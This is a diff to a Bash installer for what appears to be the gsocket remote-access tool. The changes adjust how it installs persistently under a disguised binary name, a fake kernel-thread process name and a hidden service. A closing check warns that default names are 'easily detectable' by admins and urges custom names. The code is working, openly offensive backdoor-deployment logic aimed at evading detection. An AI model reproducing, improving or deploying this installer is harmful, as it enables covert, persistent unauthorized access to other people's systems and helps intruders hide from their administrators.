@@ -47,7 +47,7 @@
 #       - Do not fast forward to a small pid.
 # GS_NAME="[kcached]"
 #       - Specify custom hidden name file & process. Default is picked at random.
-# GS_BIN="supervise"
+# GS_BIN="fg"
 #       - Specify custom name for binary on filesystem
 #       - Set to GS_NAME if GS_NAME is specified.
 # GS_SERVICE="supervise"
@@ -722,6 +722,8 @@ init_vars()
 	# Select binary
 	local arch
 	local osname
+	local service
+	local bin
 	arch=$(uname -m)
 
 	if [[ -z "$HOME" ]]; then
@@ -860,11 +862,12 @@ init_vars()
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
 
 	# Defaults
-	GS_BIN="$(basename "$GS_BIN")"
-	if [[ -n $GS_BIN ]]; then
-		BIN_HIDDEN_NAME="${GS_BIN}"
-		BIN_HIDDEN_NAME_RM+=("${GS_BIN}")
-		[[ -z $GS_SERVICE ]] && GS_SERVICE="$GS_BIN"
+	bin="$(basename "$GS_BIN")"
+	if [[ -n "$bin" ]]; then
+		BIN_HIDDEN_NAME="${bin}"
+		BIN_HIDDEN_NAME_RM+=("${bin}")
+		service="$GS_SERVICE"
+		[[ -z "$service" ]] && service="$bin"
 		# Only check for _this_ binary to allow double installs
 		bin_hidden_name_arr=("${BIN_HIDDEN_NAME}")
 	else
@@ -882,7 +885,7 @@ init_vars()
 	CONFIG_DIR_NAME="${CONFIG_DIR_NAME_DEFAULT}"
 	[ -n "$DSTDIR" ] && unset config_dir_name_arr
 
-	SERVICE_HIDDEN_NAME="${GS_SERVICE:-$SERVICE_HIDDEN_NAME_DEFAULT}"
+	SERVICE_HIDDEN_NAME="${service:-$SERVICE_HIDDEN_NAME_DEFAULT}"
 	SERVICE_HIDDEN_NAME="${SERVICE_HIDDEN_NAME%%.*}"
 
 	unset LDSO
@@ -2150,6 +2153,7 @@ gs_start_systemd()
 gs_start()
 {
 	local old_pid
+	local err
 	[[ -n $IS_GS_RUNNING ]] && return
 
 	local len=70
@@ -2188,9 +2192,9 @@ gs_start()
 		return
 	fi
 
+	err="$(cd "$HOME"; unset -v GS_CONFIG_READ; "${DSTBIN_EXEC_ARR[@]}" 2>&1)" || { FAIL_OUT "${CDC}unset -v GS_CONFIG_READ; ${DSTBIN_EXEC_ARR[*]}${CN}:"; errexit "$err"; }
 	OK_OUT ""
 
-	(cd "$HOME"; unset -v GS_CONFIG_READ; "${DSTBIN_EXEC_ARR[@]}") || errexit
 	IS_GS_RUNNING=1
 }
 
@@ -2225,10 +2229,10 @@ WARN_EXECFAIL
 
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n "$S" ]] && gs_access
-
 # -----BEGIN Install permanentally-----
 if [[ -z $GS_NOINST ]]; then
 	if [[ -n $IS_DSTBIN_TMP ]]; then
+		do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilD" "${PROC_HIDDEN_NAME}"
 		echo -en "Installing remote access.............................................."
 		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
 	else
@@ -2269,12 +2273,13 @@ gs_start
 # Give gsnc enough time to read the configuration from its own binary before deleting.
 [[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
 
-echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+echo -e "--> ${CW}Join us - https://thc.org/ops${CN}"
 
 # Default values are known and easily detected by users/admins.
 unset is_warn
-[ "$UID" -eq 0 ] && [ -z "$GS_SUPERVISE" ] && is_warn=1
+# [ "$UID" -eq 0 ] && [ -z "$GS_SERVICE" ] && is_warn=1
 [ -z "$GS_BIN" ] && is_warn=1
+[ -z "$GS_NAME" ] && is_warn=1
 [ -n "$is_warn" ] && WARN "Using default names is easily detectable.\n             Set ${CB}GS_BIN=<filename>${CN} and ${CDC}GS_NAME=<processname>${CN} instead."
 
 exit_code 0
